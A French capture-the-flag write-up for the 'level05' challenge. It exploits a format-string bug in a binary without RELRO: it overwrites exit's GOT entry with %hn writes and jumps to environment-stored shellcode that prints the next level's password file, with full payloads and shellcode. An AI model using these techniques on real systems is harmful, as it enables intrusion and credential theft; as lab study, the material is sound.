Comme on le voit lorsqu'on se connecte a l'utilisateur level05, l'executable n'utilise pas le RELRO ce qui signifie que l'on peut modifier certaines parties du programme qui vont etre executees. Lorsqu'on appelle une fonction de la libc, il y a une indirection qui passe par la GOT (global offset table), qui contient les adresses reelles de la fonction. On peut modifier l'adresse en question car le RELRO est desactive.

On voit que ce programme a une vulnerabilite de format string. On voit aussi qu'il appelle exit explicitement, on pourrait rediriger exit vers un shellcode.

```
level05@OverRide:~$ gdb level05
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
(gdb)
```
L'addresse contenant la redirection de exit est 0x80497e0. Si on ecrit a cette addresse l'addresse de notre shellcode, il s'executera a la place de exit.

Pour ecrire l'addresse, on peut utiliser le specifier %n, qui va ecrire le nombre de caracteres ecrit par printf a une addresse passee en parametre. On peut forcer printf a ecrire N caracteres, mais on ne peut malheureusement pas ecrire l'addresse en dur directement car elle est trop grande. Il faudra donc ecrire les offsets a deux addresses separees, 16-bit a la fois.

Voici le programme qu'on va utiliser pour avoir l'adresse de notre shellcode, qui est contenu dans les variables d'environnement:
```
#include <stdio.h>

int main() {
    char *ptr = getenv("SHELLCODE");
    printf("%p\n", ptr);
}
```
> gcc env.c -m32

Notre shellcode, qui print le contenu de .pass: `\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass`

L'adresse du shellcode est 0xffffd836, mais l'adresse peut changer lorsqu'on charge le programme. On ajoute donc une NOP slide de 128 bytes pour avoir une marge:

```
export SHELLCODE=`python -c 'print "\x90" * 128 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass"'`
```

Voici le modele de format string que l'on va utiliser:
`adresse_premiers_16bits|adresse_seconds_16bits|%offset1|%10$hn|%offset2|%11$hn`

```
adresse1 = 0xd836 = 55350
adresse2 = 0xffff = 65535
offset1 = adresse1 - 8 (bytes pour les deux adresses dans le format string) = 55342
offset2 = adresse2 - adresse1 = 10185
```

```
$> echo $'\xe0\x97\x04\x08\xe2\x97\x04\x08%55342d%10$hn%10185d%11$hn\n' > /tmp/level05.txt
$> cat /tmp/level05.txt - | ./level05
```
